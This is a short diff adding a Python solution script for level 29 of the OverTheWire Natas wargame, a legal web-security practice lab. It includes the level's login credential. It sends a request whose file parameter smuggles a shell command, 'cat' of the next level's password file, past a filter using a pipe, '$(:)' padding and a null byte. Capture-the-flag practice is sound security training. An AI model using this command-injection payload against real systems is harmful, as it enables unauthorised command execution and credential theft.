@@ -1,0 +1,10 @@
+natas29:pc0w0Vo0KpTHcEsgMhXu2EwUzyYemPno
+
+import requests
+
+url = 'http://natas29.natas.labs.overthewire.org'
+s = requests.Session()
+s.auth = ('natas29', 'pc0w0Vo0KpTHcEsgMhXu2EwUzyYemPno')
+
+r = s.get(url + '/index.pl?file=|cat /etc/nat$(:)as_webpass/nat$(:)as30%00')
+print(r.text)
